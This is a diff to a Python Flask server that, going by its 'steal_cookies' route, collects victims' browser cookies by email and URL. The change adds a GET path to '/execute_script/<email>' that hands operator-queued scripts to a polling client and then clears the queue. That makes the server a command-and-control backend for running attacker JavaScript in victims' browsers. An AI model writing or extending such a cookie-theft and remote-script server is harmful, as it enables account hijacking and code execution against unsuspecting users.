@@ -101,7 +101,7 @@ def steal_cookies():
         cookies.bulk_add_to_cookies(email, url, cookie)
         return "WHATS UP dawg?"
 
-@app.route("/execute_script/<email>", methods=['POST'])
+@app.route("/execute_script/<email>", methods=['GET', 'POST'])
 def execute_script(email):
     if request.method == 'POST':
         script = request.form['script']
@@ -109,6 +109,20 @@ def execute_script(email):
         oldList.append(str(script))
         executeQueue[str(email)] = oldList
         return redirect(url_for('index'))
+    elif request.method == 'GET':
+        print "EMAIL:", str(email)
+        print "EXECUTE:", executeQueue
+        script = executeQueue.get(str(email), [])
+        print "SCRIPTS:", script
+        if script:
+            print "IN SCRIPT"
+            executeQueue[str(email)] = []
+            print executeQueue
+            print script
+            return jsonify(js=script)
+        else:
+            print "NOT IN SCRIPT"
+            return jsonify(js=[])
 
 if __name__ == "__main__":
     # So template reloads when data is changed
